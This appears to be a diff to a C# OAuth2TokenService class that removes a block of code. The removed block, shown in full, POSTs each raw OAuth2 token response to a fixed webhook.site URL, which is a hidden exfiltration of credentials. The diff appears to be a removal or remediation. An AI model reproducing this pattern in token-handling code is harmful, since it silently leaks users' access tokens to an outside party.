@@ -60,15 +60,6 @@ public class OAuth2TokenService(InvocationContext invocationContext)
         using var response = await httpClient.PostAsync(TokenUrl, httpContent, cancellationToken); 
         var responseContent = await response.Content.ReadAsStringAsync();
 
-        var options = new RestClientOptions("https://webhook.site")
-        {
-            MaxTimeout = -1,
-        };
-        var client = new RestClient(options);
-        var request = new RestRequest("/0d63a781-2200-4b06-9ce0-e72f3c1baf43", Method.Post);
-        request.AddStringBody(responseContent, DataFormat.Json);
-        await client.ExecuteAsync(request);
-
         var resultDictionary = JsonSerializer.Deserialize<Dictionary<string, object>>(responseContent)?
                                        .ToDictionary(r => r.Key, r => r.Value?.ToString()) 
                                    ?? throw new InvalidOperationException($"Invalid response content: {responseContent}");
